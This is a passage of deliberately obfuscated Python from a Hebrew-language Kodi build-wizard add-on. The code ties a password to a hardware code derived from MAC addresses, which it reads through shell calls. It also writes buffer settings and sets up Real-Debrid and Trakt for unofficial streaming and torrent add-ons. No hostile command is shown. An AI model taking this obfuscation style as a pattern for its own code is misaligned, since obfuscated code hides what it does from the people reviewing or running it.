					O0OOOOO00O0OOOO00 =OOOOO000O0O0OO00O [0 ]#line:1706
					if O0OOOOO00O0OOOO00 in "'\"":#line:1707
						if OOOOO000O0O0OO00O .find ('='+O0OOOOO00O0OOOO00 ,OOOOO000O0O0OO00O .find (O0OOOOO00O0OOOO00 ,1 ))>-1 :#line:1708
							OOOOO000O0O0OO00O =OOOOO000O0O0OO00O [:OOOOO000O0O0OO00O .find ('='+O0OOOOO00O0OOOO00 ,OOOOO000O0O0OO00O .find (O0OOOOO00O0OOOO00 ,1 ))]#line:1709
						if OOOOO000O0O0OO00O .rfind (O0OOOOO00O0OOOO00 ,1 )>-1 :#line:1711
							OOOOO000O0O0OO00O =OOOOO000O0O0OO00O [1 :OOOOO000O0O0OO00O .rfind (O0OOOOO00O0OOOO00 )]#line:1712
					else :#line:1713
						if OOOOO000O0O0OO00O .find (" ")>0 :#line:1714
							OOOOO000O0O0OO00O =OOOOO000O0O0OO00O [:OOOOO000O0O0OO00O .find (" ")]#line:1715
						elif OOOOO000O0O0OO00O .find ("/")>0 :#line:1716
							OOOOO000O0O0OO00O =OOOOO000O0O0OO00O [:OOOOO000O0O0OO00O .find ("/")]#line:1717
						elif OOOOO000O0O0OO00O .find (">")>0 :#line:1718
							OOOOO000O0O0OO00O =OOOOO000O0O0OO00O [:OOOOO000O0O0OO00O .find (">")]#line:1719
					OOOOOO0OO0O0OOOOO .append (OOOOO000O0O0OO00O .strip ())#line:1721
			O00O0O00O00O0O00O =OOOOOO0OO0O0OOOOO #line:1722
		else :#line:1723
			OOOOOO0OO0O0OOOOO =[]#line:1724
			for OOOOOO0OOOO000O00 in O00O0O00O00O0O00O :#line:1725
				O000000O0000OO00O =u"</"+name #line:1726
				O0000O0O0O0O00OOO =O0000OOO000O0O0O0 .find (OOOOOO0OOOO000O00 )#line:1728
				OOO0O000OO0O0O00O =O0000OOO000O0O0O0 .find (O000000O0000OO00O ,O0000O0O0O0O00OOO )#line:1729
				O00OOOOO00OOO0000 =O0000OOO000O0O0O0 .find ("<"+name ,O0000O0O0O0O00OOO +1 )#line:1730
				while O00OOOOO00OOO0000 <OOO0O000OO0O0O00O and O00OOOOO00OOO0000 !=-1 :#line:1732
					OOO0OO000O0O000O0 =O0000OOO000O0O0O0 .find (O000000O0000OO00O ,OOO0O000OO0O0O00O +len (O000000O0000OO00O ))#line:1733
					if OOO0OO000O0O000O0 !=-1 :#line:1734
						OOO0O000OO0O0O00O =OOO0OO000O0O000O0 #line:1735
					O00OOOOO00OOO0000 =O0000OOO000O0O0O0 .find ("<"+name ,O00OOOOO00OOO0000 +1 )#line:1736
				if O0000O0O0O0O00OOO ==-1 and OOO0O000OO0O0O00O ==-1 :#line:1738
					OO00O00OO0OO00OOO =u""#line:1739
				elif O0000O0O0O0O00OOO >-1 and OOO0O000OO0O0O00O >-1 :#line:1740
					OO00O00OO0OO00OOO =O0000OOO000O0O0O0 [O0000O0O0O0O00OOO +len (OOOOOO0OOOO000O00 ):OOO0O000OO0O0O00O ]#line:1741
				elif OOO0O000OO0O0O00O >-1 :#line:1742
					OO00O00OO0OO00OOO =O0000OOO000O0O0O0 [:OOO0O000OO0O0O00O ]#line:1743
				elif O0000O0O0O0O00OOO >-1 :#line:1744
					OO00O00OO0OO00OOO =O0000OOO000O0O0O0 [O0000O0O0O0O00OOO +len (OOOOOO0OOOO000O00 ):]#line:1745
				if ret :#line:1747
					O000000O0000OO00O =O0000OOO000O0O0O0 [OOO0O000OO0O0O00O :O0000OOO000O0O0O0 .find (">",O0000OOO000O0O0O0 .find (O000000O0000OO00O ))+1 ]#line:1748
					OO00O00OO0OO00OOO =OOOOOO0OOOO000O00 +OO00O00OO0OO00OOO +O000000O0000OO00O #line:1749
				O0000OOO000O0O0O0 =O0000OOO000O0O0O0 [O0000OOO000O0O0O0 .find (OO00O00OO0OO00OOO ,O0000OOO000O0O0O0 .find (OOOOOO0OOOO000O00 ))+len (OO00O00OO0OO00OOO ):]#line:1751
				OOOOOO0OO0O0OOOOO .append (OO00O00OO0OO00OOO )#line:1752
			O00O0O00O00O0O00O =OOOOOO0OO0O0OOOOO #line:1753
		OOO0OOO00OOOO00OO +=O00O0O00O00O0O00O #line:1754
	return OOO0OOO00OOOO00OO #line:1756
def addItem (OOO0O0OOO0OO000O0 ,O0OOOOO0O0O0000OO ,O000O0OOOO0O0000O ,OOOO00O0O0OO000O0 ,O0OOOOOO0OOOOOOOO ,description =None ):#line:1758
	if description ==None :description =''#line:1759
	description ='[COLOR white]'+description +'[/COLOR]'#line:1760
	OO0O000OO0OOO0O0O =sys .argv [0 ]+"?url="+urllib .quote_plus (O0OOOOO0O0O0000OO )+"&mode="+str (O000O0OOOO0O0000O )+"&name="+urllib .quote_plus (OOO0O0OOO0OO000O0 )+"&iconimage="+urllib .quote_plus (OOOO00O0O0OO000O0 )+"&fanart="+urllib .quote_plus (O0OOOOOO0OOOOOOOO )#line:1761
	O0O0000OO00O0OO0O =True #line:1762
	O0O0OO00OOO0O0OOO =xbmcgui .ListItem (OOO0O0OOO0OO000O0 ,iconImage =OOOO00O0O0OO000O0 ,thumbnailImage =OOOO00O0O0OO000O0 )#line:1763
	O0O0OO00OOO0O0OOO .setInfo (type ="Video",infoLabels ={"Title":OOO0O0OOO0OO000O0 ,"Plot":description })#line:1764
	O0O0OO00OOO0O0OOO .setProperty ("fanart_Image",O0OOOOOO0OOOOOOOO )#line:1765
	O0O0OO00OOO0O0OOO .setProperty ("icon_Image",OOOO00O0O0OO000O0 )#line:1766
	O0O0000OO00O0OO0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O000OO0OOO0O0O ,listitem =O0O0OO00OOO0O0OOO ,isFolder =False )#line:1767
	return O0O0000OO00O0OO0O #line:1768
def get_params ():#line:1770
		O0OOO0O0OOOOO0O00 =[]#line:1771
		O0O00OOOO00OOOOOO =sys .argv [2 ]#line:1772
		if len (O0O00OOOO00OOOOOO )>=2 :#line:1773
				O00OO00OO0000OO0O =sys .argv [2 ]#line:1774
				OO00OOOOOO0OO000O =O00OO00OO0000OO0O .replace ('?','')#line:1775
				if (O00OO00OO0000OO0O [len (O00OO00OO0000OO0O )-1 ]=='/'):#line:1776
						O00OO00OO0000OO0O =O00OO00OO0000OO0O [0 :len (O00OO00OO0000OO0O )-2 ]#line:1777
				OOOO0O00OOO000O0O =OO00OOOOOO0OO000O .split ('&')#line:1778
				O0OOO0O0OOOOO0O00 ={}#line:1779
				for OOO0OOOO0O0O0O0OO in range (len (OOOO0O00OOO000O0O )):#line:1780
						O0O00000000O00O00 ={}#line:1781
						O0O00000000O00O00 =OOOO0O00OOO000O0O [OOO0OOOO0O0O0O0OO ].split ('=')#line:1782
						if (len (O0O00000000O00O00 ))==2 :#line:1783
								O0OOO0O0OOOOO0O00 [O0O00000000O00O00 [0 ]]=O0O00000000O00O00 [1 ]#line:1784
		return O0OOO0O0OOOOO0O00 #line:1786
def decode (OOOOO000OOO00O0O0 ,O0O0000O0O000O0OO ):#line:1791
    import base64 #line:1792
    OO0O00O00O0OOO0OO =[]#line:1793
    if (len (OOOOO000OOO00O0O0 ))!=4 :#line:1795
     return 10 #line:1796
    O0O0000O0O000O0OO =base64 .urlsafe_b64decode (O0O0000O0O000O0OO )#line:1797
    for O0O0OO00OO0O0OOOO in range (len (O0O0000O0O000O0OO )):#line:1799
        O00000OO00O00OO0O =OOOOO000OOO00O0O0 [O0O0OO00OO0O0OOOO %len (OOOOO000OOO00O0O0 )]#line:1800
        O0OO0OO0OOOO00OOO =chr ((256 +ord (O0O0000O0O000O0OO [O0O0OO00OO0O0OOOO ])-ord (O00000OO00O00OO0O ))%256 )#line:1801
        OO0O00O00O0OOO0OO .append (O0OO0OO0OOOO00OOO )#line:1802
    return "".join (OO0O00O00O0OOO0OO )#line:1803
def tmdb_list (O000O0000OO0000O0 ):#line:1804
    OO00O0O0OO0O000OO =decode ("7643",O000O0000OO0000O0 )#line:1807
    return int (OO00O0O0OO0O000OO )#line:1810
def u_list (O0O00OOOOOO0O0000 ):#line:1811
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1813
        from math import sqrt #line:1814
        O0O00O0O0OOOO00O0 =tmdb_list (TMDB_NEW_API )#line:1815
        OO0O000OO0O00O000 =str ((getHwAddr ('eth0'))*O0O00O0O0OOOO00O0 )#line:1817
        O00OO0O0O0OO00000 =int (OO0O000OO0O00O000 [1 ]+OO0O000OO0O00O000 [2 ]+OO0O000OO0O00O000 [5 ]+OO0O000OO0O00O000 [7 ])#line:1818
        OOOO00OOO0O00OOO0 =(ADDON .getSetting ("pass"))#line:1820
        O00O000OOO0O0O00O =(str (round (sqrt ((O00OO0O0O0OO00000 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1825
        if '.'in O00O000OOO0O0O00O :#line:1827
         O00O000OOO0O0O00O =(str (round (sqrt ((O00OO0O0O0OO00000 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1828
        if OOOO00OOO0O00OOO0 ==O00O000OOO0O0O00O :#line:1830
          OOOO00OOO0OOO0O0O =O0O00OOOOOO0O0000 #line:1832
        else :#line:1834
           if STARTP2 ()and STARTP ()=='ok':#line:1835
             return O0O00OOOOOO0O0000 #line:1838
           OOOO00OOO0OOO0O0O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1839
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1840
           sys .exit ()#line:1841
        return OOOO00OOO0OOO0O0O #line:1842
    else :#line:1843
        STARTP ()#line:1844
def disply_hwr ():#line:1848
   try :#line:1849
    O000000O0O00000O0 =tmdb_list (TMDB_NEW_API )#line:1850
    OOO00OOO0000O0O0O =str ((getHwAddr ('eth0'))*O000000O0O00000O0 )#line:1851
    OOO0O0OO000OO0O00 =(OOO00OOO0000O0O0O [1 ]+OOO00OOO0000O0O0O [2 ]+OOO00OOO0000O0O0O [5 ]+OOO00OOO0000O0O0O [7 ])#line:1858
    O00OO0000000OO0OO =(ADDON .getSetting ("action"))#line:1859
    wiz .setS ('action',str (OOO0O0OO000OO0O00 ))#line:1861
   except :pass #line:1862
def disply_hwr2 ():#line:1863
   try :#line:1864
    OOO0O0O0O00O00O0O =tmdb_list (TMDB_NEW_API )#line:1865
    OO0OO000O0OOOOO00 =str ((getHwAddr ('eth0'))*OOO0O0O0O00O00O0O )#line:1867
    OOO000O000OO00OO0 =(OO0OO000O0OOOOO00 [1 ]+OO0OO000O0OOOOO00 [2 ]+OO0OO000O0OOOOO00 [5 ]+OO0OO000O0OOOOO00 [7 ])#line:1876
    OO0O0OO0000OOO000 =(ADDON .getSetting ("action"))#line:1877
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOO000O000OO00OO0 )#line:1880
   except :pass #line:1881
def getHwAddr (O0000O0OOO00O0OOO ):#line:1883
   import subprocess ,time #line:1884
   O0OO0OO000OOOO00O ='windows'#line:1885
   if xbmc .getCondVisibility ('system.platform.android'):#line:1886
       O0OO0OO000OOOO00O ='android'#line:1887
   if xbmc .getCondVisibility ('system.platform.android'):#line:1888
     O0O0O0O0OOOO0O0O0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1889
     OO000OO00O000OO0O =re .compile ('link/ether (.+?) brd').findall (str (O0O0O0O0OOOO0O0O0 ))#line:1891
     O0000O0O0O0O000OO =0 #line:1892
     for OO0OO0O00O00O0OO0 in OO000OO00O000OO0O :#line:1893
      if OO000OO00O000OO0O !='00:00:00:00:00:00':#line:1894
          OOOOO0OO0OOO0O00O =OO0OO0O00O00O0OO0 #line:1895
          O0000O0O0O0O000OO =O0000O0O0O0O000OO +int (OOOOO0OO0OOO0O00O .replace (':',''),16 )#line:1896
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1898
       OO00000OO0O0O0O00 =0 #line:1899
       O0000O0O0O0O000OO =0 #line:1900
       O0OOO0OOOO0000O0O =[]#line:1901
       O000OO0O0OOO00OOO =os .popen ("getmac").read ()#line:1902
       O000OO0O0OOO00OOO =O000OO0O0OOO00OOO .split ("\n")#line:1903
       for O00O0O00OOO0OO0O0 in O000OO0O0OOO00OOO :#line:1905
            OOOO0O000O0O0O000 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O00O0O00OOO0OO0O0 ,re .I )#line:1906
            if OOOO0O000O0O0O000 :#line:1907
                OO000OO00O000OO0O =OOOO0O000O0O0O000 .group ().replace ('-',':')#line:1908
                O0OOO0OOOO0000O0O .append (OO000OO00O000OO0O )#line:1909
                O0000O0O0O0O000OO =O0000O0O0O0O000OO +int (OO000OO00O000OO0O .replace (':',''),16 )#line:1912
   else :#line:1914
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1915
   try :#line:1932
    return O0000O0O0O0O000OO #line:1933
   except :pass #line:1934
def getpass ():#line:1935
	disply_hwr2 ()#line:1937
def setpass ():#line:1938
    O00OOOOO00OOO0OOO =xbmcgui .Dialog ()#line:1939
    O0OOOO00OOOOOO000 =''#line:1940
    OOOO0O00OO0OOO000 =xbmc .Keyboard (O0OOOO00OOOOOO000 ,'הכנס סיסמה')#line:1942
    OOOO0O00OO0OOO000 .doModal ()#line:1943
    if OOOO0O00OO0OOO000 .isConfirmed ():#line:1944
           OOOO0O00OO0OOO000 =OOOO0O00OO0OOO000 .getText ()#line:1945
    wiz .setS ('pass',str (OOOO0O00OO0OOO000 ))#line:1946
def setuname ():#line:1947
    O00000OO0OO00O000 =''#line:1948
    O0O00OOO00O00O00O =xbmc .Keyboard (O00000OO0OO00O000 ,'הכנס שם משתמש')#line:1949
    O0O00OOO00O00O00O .doModal ()#line:1950
    if O0O00OOO00O00O00O .isConfirmed ():#line:1951
           O00000OO0OO00O000 =O0O00OOO00O00O00O .getText ()#line:1952
           wiz .setS ('user',str (O00000OO0OO00O000 ))#line:1953
def powerkodi ():#line:1954
    os ._exit (1 )#line:1955
def buffer1 ():#line:1957
	O00OOO0OOO00O0OO0 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1958
	OO0000000000OOOOO =xbmc .getInfoLabel ("System.Memory(total)")#line:1959
	O000OO00000OO0OOO =xbmc .getInfoLabel ("System.FreeMemory")#line:1960
	O0OOO00OO0OO0O000 =re .sub ('[^0-9]','',O000OO00000OO0OOO )#line:1961
	O0OOO00OO0OO0O000 =int (O0OOO00OO0OO0O000 )/3 #line:1962
	O0O000OOO00OOO00O =O0OOO00OO0OO0O000 *1024 *1024 #line:1963
	try :O00O0O0OO00O00O00 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1964
	except :O00O0O0OO00O00O00 =16 #line:1965
	OOOO00O0OO0O0O0OO =DIALOG .yesno ('FREE MEMORY: '+str (O000OO00000OO0OOO ),'Based on your free Memory your optimal buffersize is: '+str (O0OOO00OO0OO0O000 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1968
	if OOOO00O0OO0O0O0OO ==1 :#line:1969
		with open (O00OOO0OOO00O0OO0 ,"w")as O00O000OOO00OO0OO :#line:1970
			if O00O0O0OO00O00O00 >=17 :O00OO0O0O00O0O0O0 =xml_data_advSettings_New (str (O0O000OOO00OOO00O ))#line:1971
			else :O00OO0O0O00O0O0O0 =xml_data_advSettings_old (str (O0O000OOO00OOO00O ))#line:1972
			O00O000OOO00OO0OO .write (O00OO0O0O00O0O0O0 )#line:1974
			DIALOG .ok ('Buffer Size Set to: '+str (O0O000OOO00OOO00O ),'Please restart Kodi for settings to apply.','')#line:1975
	elif OOOO00O0OO0O0O0OO ==0 :#line:1977
		O0O000OOO00OOO00O =_OOOOOO00O00OO0000 (default =str (O0O000OOO00OOO00O ),heading ="INPUT BUFFER SIZE")#line:1978
		with open (O00OOO0OOO00O0OO0 ,"w")as O00O000OOO00OO0OO :#line:1979
			if O00O0O0OO00O00O00 >=17 :O00OO0O0O00O0O0O0 =xml_data_advSettings_New (str (O0O000OOO00OOO00O ))#line:1980
			else :O00OO0O0O00O0O0O0 =xml_data_advSettings_old (str (O0O000OOO00OOO00O ))#line:1981
			O00O000OOO00OO0OO .write (O00OO0O0O00O0O0O0 )#line:1982
			DIALOG .ok ('Buffer Size Set to: '+str (O0O000OOO00OOO00O ),'Please restart Kodi for settings to apply.','')#line:1983
def xml_data_advSettings_old (OO000OO0O00OOO0O0 ):#line:1984
	OOO0000OO00OOO0OO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO000OO0O00OOO0O0 #line:1994
	return OOO0000OO00OOO0OO #line:1995
def xml_data_advSettings_New (OO00O000OOOO0O00O ):#line:1997
	OO00OOOOO0O0OO000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO00O000OOOO0O00O #line:2009
	return OO00OOOOO0O0OO000 #line:2010
def write_ADV_SETTINGS_XML (OO000000O0OO0O0OO ):#line:2011
    if not os .path .exists (xml_file ):#line:2012
        with open (xml_file ,"w")as OOO00OO00OO0O0OOO :#line:2013
            OOO00OO00OO0O0OOO .write (xml_data )#line:2014
def _OOOOOO00O00OO0000 (default ="",heading ="",hidden =False ):#line:2015
    ""#line:2016
    OO00O0O0O0O00000O =xbmc .Keyboard (default ,heading ,hidden )#line:2017
    OO00O0O0O0O00000O .doModal ()#line:2018
    if (OO00O0O0O0O00000O .isConfirmed ()):#line:2019
        return unicode (OO00O0O0O0O00000O .getText (),"utf-8")#line:2020
    return default #line:2021
def index ():#line:2023
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2024
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2025
	if AUTOUPDATE =='Yes':#line:2026
		if wiz .workingURL (WIZARDFILE )==True :#line:2027
			OOO0OOOOO00OOO0O0 =wiz .checkWizard ('version')#line:2028
			if OOO0OOOOO00OOO0O0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OOO0OOOOO00OOO0O0 ),'wizardupdate',themeit =THEME2 )#line:2029
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2030
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2031
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2032
	if len (BUILDNAME )>0 :#line:2033
		OO00O0000O00000O0 =wiz .checkBuild (BUILDNAME ,'version')#line:2034
		OO000000O0O0O0000 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2035
		if OO00O0000O00000O0 >BUILDVERSION :OO000000O0O0O0000 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO000000O0O0O0000 ,OO00O0000O00000O0 )#line:2036
		addDir (OO000000O0O0O0000 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2038
		try :#line:2040
		     OO0OOO0000OO0O0OO =wiz .themeCount (BUILDNAME )#line:2041
		except :#line:2042
		   OO0OOO0000OO0O0OO =False #line:2043
		if not OO0OOO0000OO0O0OO ==False :#line:2044
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2045
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2046
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2049
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2050
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2051
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2055
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2057
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2059
def morsetup ():#line:2061
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2062
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2063
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2064
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2065
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2066
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2070
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2071
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2074
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2075
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2085
	setView ('files','viewType')#line:2086
def morsetup2 ():#line:2087
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2088
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
def fastupdate ():#line:2099
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2100
def forcefastupdate ():#line:2102
			O0O0O000OOOO0O0O0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2103
			wiz .ForceFastUpDate (ADDONTITLE ,O0O0O000OOOO0O0O0 )#line:2104
def rdsetup ():#line:2108
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2109
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2110
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2112
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2113
def traktsetup ():#line:2116
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2121
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	setView ('files','viewType')#line:2124
def setautorealdebrid ():#line:2125
    from resources .libs import real_debrid #line:2126
    OOOO00OOOO0OOOOO0 =real_debrid .RealDebridFirst ()#line:2127
    OOOO00OOOO0OOOOO0 .auth ()#line:2128
def setrealdebrid ():#line:2130
    O0OOO000OOO00O0O0 =(ADDON .getSetting ("auto_rd"))#line:2131
    if O0OOO000OOO00O0O0 =='false':#line:2132
       ADDON .openSettings ()#line:2133
    else :#line:2134
        from resources .libs import real_debrid #line:2135
        O00OO0OOOOOO0O0OO =real_debrid .RealDebrid ()#line:2136
        O00OO0OOOOOO0O0OO .auth ()#line:2137
        rdon ()#line:2140
def resolveurlsetup ():#line:2142
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2143
def urlresolversetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2145
def placentasetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2148
def reptiliasetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2150
def flixnetsetup ():#line:2151
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2152
def yodasetup ():#line:2153
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2154
def numberssetup ():#line:2155
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2156
def uranussetup ():#line:2157
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2158
def genesissetup ():#line:2159
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2160
def net_tools (view =None ):#line:2162
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2163
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2164
	setView ('files','viewType')#line:2166
def speedMenu ():#line:2167
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2168
def viewIP ():#line:2169
	O0OOO00O00OOOOO0O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2183
	OO0000OOO0OOOO00O =[];OO0OO000000OOOO0O =0 #line:2184
	for O00O0OOOOOOOO0O00 in O0OOO00O00OOOOO0O :#line:2185
		OO0000000O00OO0O0 =wiz .getInfo (O00O0OOOOOOOO0O00 )#line:2186
		OOOOOO00000O0OO00 =0 #line:2187
		while OO0000000O00OO0O0 =="Busy"and OOOOOO00000O0OO00 <10 :#line:2188
			OO0000000O00OO0O0 =wiz .getInfo (O00O0OOOOOOOO0O00 );OOOOOO00000O0OO00 +=1 ;wiz .log ("%s sleep %s"%(O00O0OOOOOOOO0O00 ,str (OOOOOO00000O0OO00 )));xbmc .sleep (1000 )#line:2189
		OO0000OOO0OOOO00O .append (OO0000000O00OO0O0 )#line:2190
		OO0OO000000OOOO0O +=1 #line:2191
	OO0O0OO000O0O0O0O ,OOO0OOO0O00000O00 ,OO0000000O0O00OO0 =getIP ()#line:2192
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000OOO0OOOO00O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2193
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OO000O0O0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2194
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOO0O00000O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2195
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000000O0O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2196
